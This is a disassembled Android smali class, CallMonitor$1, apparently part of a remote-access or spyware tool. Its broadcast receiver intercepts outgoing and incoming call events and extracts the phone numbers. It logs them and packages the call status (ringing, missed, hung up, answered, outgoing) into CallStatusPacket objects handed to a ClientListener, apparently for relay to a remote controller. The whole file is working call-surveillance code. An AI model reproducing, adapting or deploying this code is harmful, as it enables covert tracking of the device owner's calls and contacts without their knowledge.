.class Lmy/app/Library/CallMonitor$1;
.super Landroid/content/BroadcastReceiver;
.source "CallMonitor.java"


# annotations
.annotation system Ldalvik/annotation/EnclosingClass;
    value = Lmy/app/Library/CallMonitor;
.end annotation

.annotation system Ldalvik/annotation/InnerClass;
    accessFlags = 0x0
    name = null
.end annotation


# static fields
.field private static final TAG:Ljava/lang/String; = "CallReceiver"


# instance fields
.field final synthetic this$0:Lmy/app/Library/CallMonitor;


# direct methods
.method constructor <init>(Lmy/app/Library/CallMonitor;)V
    .locals 0

    .prologue
    .line 1
    iput-object p1, p0, Lmy/app/Library/CallMonitor$1;->this$0:Lmy/app/Library/CallMonitor;

    .line 38
    invoke-direct {p0}, Landroid/content/BroadcastReceiver;-><init>()V

    return-void
.end method


# virtual methods
.method public onReceive(Landroid/content/Context;Landroid/content/Intent;)V
    .locals 9
    .param p1, "context"    # Landroid/content/Context;
    .param p2, "intent"    # Landroid/content/Intent;

    .prologue
    const/4 v8, 0x1

    .line 44
    invoke-virtual {p2}, Landroid/content/Intent;->getAction()Ljava/lang/String;

    move-result-object v0

    .line 46
    .local v0, "action":Ljava/lang/String;
    const-string v4, "android.intent.action.NEW_OUTGOING_CALL"

    invoke-virtual {v0, v4}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v4

    if-eqz v4, :cond_1

    .line 47
    const-string v4, "android.intent.extra.PHONE_NUMBER"

    invoke-virtual {p2, v4}, Landroid/content/Intent;->getStringExtra(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v1

    .line 48
    .local v1, "number":Ljava/lang/String;
    const-string v4, "CallReceiver"

    new-instance v5, Ljava/lang/StringBuilder;

    const-string v6, "Outgoing call to "

    invoke-direct {v5, v6}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v5, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v5

    invoke-virtual {v5}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v5

    invoke-static {v4, v5}, Landroid/util/Log;->i(Ljava/lang/String;Ljava/lang/String;)I

    .line 49
    iget-object v4, p0, Lmy/app/Library/CallMonitor$1;->this$0:Lmy/app/Library/CallMonitor;

    iget-object v4, v4, Lmy/app/Library/CallMonitor;->ctx:Lmy/app/client/ClientListener;

    iget-object v5, p0, Lmy/app/Library/CallMonitor$1;->this$0:Lmy/app/Library/CallMonitor;

    iget v5, v5, Lmy/app/Library/CallMonitor;->channel:I

    new-instance v6, LPacket/CallStatusPacket;

    const/4 v7, 0x4

    invoke-direct {v6, v7, v1}, LPacket/CallStatusPacket;-><init>(ILjava/lang/String;)V

    invoke-virtual {v6}, LPacket/CallStatusPacket;->build()[B

    move-result-object v6

    invoke-virtual {v4, v5, v6}, Lmy/app/client/ClientListener;->handleData(I[B)V

    .line 50
    iget-object v4, p0, Lmy/app/Library/CallMonitor$1;->this$0:Lmy/app/Library/CallMonitor;

    invoke-static {v8}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v5

    iput-object v5, v4, Lmy/app/Library/CallMonitor;->isCalling:Ljava/lang/Boolean;

    .line 84
    .end local v1    # "number":Ljava/lang/String;
    :cond_0
    :goto_0
    return-void

    .line 52
    :cond_1
    const-string v4, "android.intent.action.PHONE_STATE"

    invoke-virtual {v0, v4}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v4

    if-eqz v4, :cond_0

    .line 54
    const-string v4, "state"

    invoke-virtual {p2, v4}, Landroid/content/Intent;->getStringExtra(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v3

    .line 55
    .local v3, "phoneState":Ljava/lang/String;
    const-string v4, "incoming_number"

    invoke-virtual {p2, v4}, Landroid/content/Intent;->getStringExtra(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v2

    .line 57
    .local v2, "phoneNumber":Ljava/lang/String;
    if-eqz v2, :cond_2

    iget-object v4, p0, Lmy/app/Library/CallMonitor$1;->this$0:Lmy/app/Library/CallMonitor;

    iget-object v4, v4, Lmy/app/Library/CallMonitor;->phoneNumberFilter:Ljava/util/HashSet;

    if-eqz v4, :cond_2

    .line 58
    iget-object v4, p0, Lmy/app/Library/CallMonitor$1;->this$0:Lmy/app/Library/CallMonitor;

    iget-object v4, v4, Lmy/app/Library/CallMonitor;->phoneNumberFilter:Ljava/util/HashSet;

    invoke-virtual {v4, v2}, Ljava/util/HashSet;->contains(Ljava/lang/Object;)Z

    move-result v4

    if-eqz v4, :cond_0

    .line 62
    :cond_2
    sget-object v4, Landroid/telephony/TelephonyManager;->EXTRA_STATE_RINGING:Ljava/lang/String;

    invoke-virtual {v3, v4}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v4

    if-eqz v4, :cond_3

    .line 64
    iget-object v4, p0, Lmy/app/Library/CallMonitor$1;->this$0:Lmy/app/Library/CallMonitor;

    iget-object v4, v4, Lmy/app/Library/CallMonitor;->ctx:Lmy/app/client/ClientListener;

    iget-object v5, p0, Lmy/app/Library/CallMonitor$1;->this$0:Lmy/app/Library/CallMonitor;

    iget v5, v5, Lmy/app/Library/CallMonitor;->channel:I

    new-instance v6, LPacket/CallStatusPacket;

    invoke-direct {v6, v8, v2}, LPacket/CallStatusPacket;-><init>(ILjava/lang/String;)V

    invoke-virtual {v6}, LPacket/CallStatusPacket;->build()[B

    move-result-object v6

    invoke-virtual {v4, v5, v6}, Lmy/app/client/ClientListener;->handleData(I[B)V

    goto :goto_0

    .line 66
    :cond_3
    sget-object v4, Landroid/telephony/TelephonyManager;->EXTRA_STATE_IDLE:Ljava/lang/String;

    invoke-virtual {v3, v4}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v4

    if-eqz v4, :cond_5

    .line 67
    if-nez v2, :cond_4

    .line 68
    const-string v4, "CallReceiver"

    const-string v5, "Hang Up/Refused"

    invoke-static {v4, v5}, Landroid/util/Log;->i(Ljava/lang/String;Ljava/lang/String;)I

    .line 69
    iget-object v4, p0, Lmy/app/Library/CallMonitor$1;->this$0:Lmy/app/Library/CallMonitor;

    iget-object v4, v4, Lmy/app/Library/CallMonitor;->ctx:Lmy/app/client/ClientListener;

    iget-object v5, p0, Lmy/app/Library/CallMonitor$1;->this$0:Lmy/app/Library/CallMonitor;

    iget v5, v5, Lmy/app/Library/CallMonitor;->channel:I

    new-instance v6, LPacket/CallStatusPacket;

    const/4 v7, 0x5

    invoke-direct {v6, v7, v2}, LPacket/CallStatusPacket;-><init>(ILjava/lang/String;)V

    invoke-virtual {v6}, LPacket/CallStatusPacket;->build()[B

    move-result-object v6

    invoke-virtual {v4, v5, v6}, Lmy/app/client/ClientListener;->handleData(I[B)V

    .line 75
    :goto_1
    iget-object v4, p0, Lmy/app/Library/CallMonitor$1;->this$0:Lmy/app/Library/CallMonitor;

    const/4 v5, 0x0

    invoke-static {v5}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v5

    iput-object v5, v4, Lmy/app/Library/CallMonitor;->isCalling:Ljava/lang/Boolean;

    goto :goto_0

    .line 72
    :cond_4
    const-string v4, "CallReceiver"

    new-instance v5, Ljava/lang/StringBuilder;

    const-string v6, "Missed call of "

    invoke-direct {v5, v6}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v5, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v5

    invoke-virtual {v5}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v5

    invoke-static {v4, v5}, Landroid/util/Log;->i(Ljava/lang/String;Ljava/lang/String;)I

    .line 73
    iget-object v4, p0, Lmy/app/Library/CallMonitor$1;->this$0:Lmy/app/Library/CallMonitor;

    iget-object v4, v4, Lmy/app/Library/CallMonitor;->ctx:Lmy/app/client/ClientListener;

    iget-object v5, p0, Lmy/app/Library/CallMonitor$1;->this$0:Lmy/app/Library/CallMonitor;

    iget v5, v5, Lmy/app/Library/CallMonitor;->channel:I

    new-instance v6, LPacket/CallStatusPacket;

    const/4 v7, 0x2

    invoke-direct {v6, v7, v2}, LPacket/CallStatusPacket;-><init>(ILjava/lang/String;)V

    invoke-virtual {v6}, LPacket/CallStatusPacket;->build()[B

    move-result-object v6

    invoke-virtual {v4, v5, v6}, Lmy/app/client/ClientListener;->handleData(I[B)V

    goto :goto_1

    .line 77
    :cond_5
    sget-object v4, Landroid/telephony/TelephonyManager;->EXTRA_STATE_OFFHOOK:Ljava/lang/String;

    invoke-virtual {v3, v4}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v4

    if-eqz v4, :cond_0

    .line 78
    iget-object v4, p0, Lmy/app/Library/CallMonitor$1;->this$0:Lmy/app/Library/CallMonitor;

    iget-object v4, v4, Lmy/app/Library/CallMonitor;->isCalling:Ljava/lang/Boolean;

    invoke-virtual {v4}, Ljava/lang/Boolean;->booleanValue()Z

    move-result v4

    if-nez v4, :cond_0

    .line 79
    const-string v4, "CallReceiver"

    new-instance v5, Ljava/lang/StringBuilder;

    const-string v6, "Re\u00e7u d\u00e9croch\u00e9 of "

    invoke-direct {v5, v6}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v5, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v5

    invoke-virtual {v5}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v5

    invoke-static {v4, v5}, Landroid/util/Log;->i(Ljava/lang/String;Ljava/lang/String;)I

    .line 80
    iget-object v4, p0, Lmy/app/Library/CallMonitor$1;->this$0:Lmy/app/Library/CallMonitor;

    iget-object v4, v4, Lmy/app/Library/CallMonitor;->ctx:Lmy/app/client/ClientListener;

    iget-object v5, p0, Lmy/app/Library/CallMonitor$1;->this$0:Lmy/app/Library/CallMonitor;

    iget v5, v5, Lmy/app/Library/CallMonitor;->channel:I

    new-instance v6, LPacket/CallStatusPacket;

    const/4 v7, 0x3

    invoke-direct {v6, v7, v2}, LPacket/CallStatusPacket;-><init>(ILjava/lang/String;)V

    invoke-virtual {v6}, LPacket/CallStatusPacket;->build()[B

    move-result-object v6

    invoke-virtual {v4, v5, v6}, Lmy/app/client/ClientListener;->handleData(I[B)V

    goto/16 :goto_0
.end method
